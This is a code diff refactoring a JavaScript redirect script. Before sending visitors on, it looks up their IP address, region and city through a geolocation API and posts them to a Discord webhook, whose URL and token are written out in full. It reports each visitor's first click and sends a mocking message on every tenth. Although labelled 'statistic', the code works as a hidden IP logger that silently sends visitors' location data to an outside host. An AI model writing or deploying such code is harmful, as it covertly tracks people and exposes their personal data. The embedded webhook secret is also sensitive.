@@ -1,19 +1,19 @@
-const LS_ITEM_NAME = 'statistic_visits_'+document.title;
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/791761446060556299/m4H_LyHiHwoutRdEKc_oWe8jZa11XYyXU-TdPWGcm4xzMZLW7BmPhBiWkMUqDktb-C0D';
 
-if(!localStorage.getItem(LS_ITEM_NAME)) localStorage.setItem(LS_ITEM_NAME, 1);
-const visits = +localStorage.getItem(LS_ITEM_NAME);
-localStorage.setItem(LS_ITEM_NAME, visits+1);
+if(!localStorage.getItem('statistic')) {
+	localStorage.clear();
+	localStorage.setItem('statistic', '{ "visits": {} }');
+}
+
+const localData = JSON.parse(localStorage.getItem('statistic'));
+
+if(!localData.visits[document.title]) localData.visits[document.title] = 0;
+localData.visits[document.title]++;
+
 
 async function getGeoData() {
-	if(!localStorage.getItem('geo_data')) {
-		const geo = await fetch('https://api.2ip.ua/geo.json', { 
-			method: "GET" 
-		}).then(res => res.json());
-
-		localStorage.setItem('geo_data', JSON.stringify(geo));
-	}
-	return JSON.parse(localStorage.getItem('geo_data'));
+	if(!localData.geo) localData.geo = await fetch('https://api.2ip.ua/geo.json', { method: "GET" }).then(res => res.json());
+	return localData.geo;
 }
 
 function executeWebhook(url, data){
@@ -38,7 +38,7 @@ async function statistic() {
 		avatar_url: 'https://www.google.com/s2/favicons?sz=256&domain_url=' + location.href,
 		username: document.title
 	}
-	if(visits == 1) data.embed = {
+	if(localData.visits[document.title] == 1) data.embed = {
  		title: geo.country,
     description: `**ip**: ${geo.ip}\n`+
     `**Область**: ${geo.region_rus}\n`+
@@ -46,12 +46,13 @@ async function statistic() {
     url: `https://api.2ip.ua/geo.json?ip=${geo.ip}`,
     color: 16382457,
 	}
-	else if(!(visits % 10)) data.content = `[UTC${geo.time_zone}] | ${geo.city_rus} | ${geo.ip} в ${visits} раз переходит по ссылке "${data.username}". Зачем?`;
+	else if(!(localData.visits[document.title] % 10)) data.content = `[UTC${geo.time_zone}] | ${geo.city_rus} | ${geo.ip} в ${localData.visits[document.title]} раз переходит по ссылке "${data.username}". Зачем?`;
 	else return;
 	return executeWebhook(WEBHOOK_URL, data);
 }
 
-async function redirect(url){
+const redirect = async (url) => {
 	await statistic();
+	localStorage.setItem('statistic', JSON.stringify(localData));
 	window.location.replace(url);
 }
